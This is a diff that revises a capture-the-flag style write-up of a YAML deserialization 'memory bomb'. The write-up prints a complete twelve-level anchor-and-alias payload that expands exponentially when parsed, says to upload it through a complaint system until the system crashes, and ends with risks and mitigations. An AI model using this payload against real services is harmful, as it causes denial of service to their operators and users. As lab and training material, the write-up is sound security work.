@@ -1,53 +1,47 @@
-# **Unsafe 5-memory deserialization bomb**
+# **Insecure Deserialization-5-Memory Bomb**
 
 ## 1. Methodology
 
 **Step 1 – Create a malicious YAML file**
 
-- Create a .yml file with a special structure that uses YAML anchors and aliases. These elements allow you to create a "memory bomb" by causing very rapid data expansion.
+- Create a .yml file with a special structure that uses YAML anchors and aliases. These elements create a “memory bomb” by causing data to expand very rapidly.
 
-**Step 2 – File Contents**
+**Step 2 – File content**
 
 - Use this structure to build a string where each level repeats the previous one many times:
-
 ```
-a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
-b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
-c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
-d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
-e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
-f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
+  a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
+  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
+  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
+  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
+  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
+  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
+  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
+  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
+  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
+  j: &j [*i,*i,*i,*i,*i,*i,*i,*i,*i,*i]
+  k: &k [*j,*j,*j,*j,*j,*j,*j,*j,*j,*j]
+  l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
+  ```
 
-g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
+- This structure acts like a bomb because each level copies the previous one several times, causing the data to grow enormously when the program reads the YAML file.
 
-h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
+**Step 3 – Upload via the complaint system**
 
-i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
-
-j: &j [*i,*i,*i,*i,*i,*i,*i,*i,*i,*i]
-
-k: &k [*j,*j,*j,*j,*j,*j,*j,*j,*j,*j]
-
-l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
-```
-- This structure acts like a bomb because each level copies the previous one multiple times, causing the data to grow significantly when the program reads the YAML file.
-
-**Step 3 – Upload via the Complaint System**
-
-- Submit the malicious .yml file via the complaint system to activate the vulnerability.
+- Send the malicious .yml file through the complaint system to activate the vulnerability.
 
 **Step 4 – Validation**
 
-- The challenge is successful when the memory bomb is triggered, using excessive memory and causing the system to crash.
+- The challenge is successful when the memory bomb is triggered, using too much memory and causing the system to crash.
 
-## Techniques Used:
+## Techniques used:
 
-- YAML Deserialization Attack
-- Denial of Service (DoS)
+- YAML deserialization attack
+- Denial of service (DoS)
 
-## Tools Used:
+## Tools used:
 
-- Text editor for creating the YAML file
+- Text editor to create the YAML file
 
 ---
 
@@ -55,10 +49,10 @@ l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
 
 **Vulnerability:**
 
-- YAML Deserialization Vulnerability
-- Denial of Service
+- YAML deserialization vulnerability
+- Denial of service
 
-**Affected Component:**
+**Affected component:**
 
 - YAML file upload system via complaint
 
@@ -68,11 +62,12 @@ l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
 
 ---
 
+
 ## 3. Risks
 
-- Excessive memory usage, which can cause a denial of service or system crash.
+- Excessive memory usage, which can cause denial of service or system crashes.
 
-- Commercial Impact: loss of user trust, damage to reputation.
+-Business impact: user trust loss, reputational damage.
 
 ---
 
@@ -82,18 +77,18 @@ l: &l [*k,*k,*k,*k,*k,*k,*k,*k,*k,*k]
 
 - Disable alias processing in uploaded YAML files.
 
-**Correction**
+**Fix**
 
 - Use secure YAML reading libraries, or limit file size and structure complexity.
 
-**Best Practices**
+**Best practices**
 
-- OWASP: Deserialize untrusted data.
+- OWASP: Deserialization of untrusted data.
 
 ---
 
 ## 5. Evidence
 
-**Memory Bomb YAML Structure**
+**Structure YAML de la bombe mémoire**
 ![Memory Bomb](./image/memory_bomb1.png)
 ![Memory Bomb](./image/memory_bomb2.png)
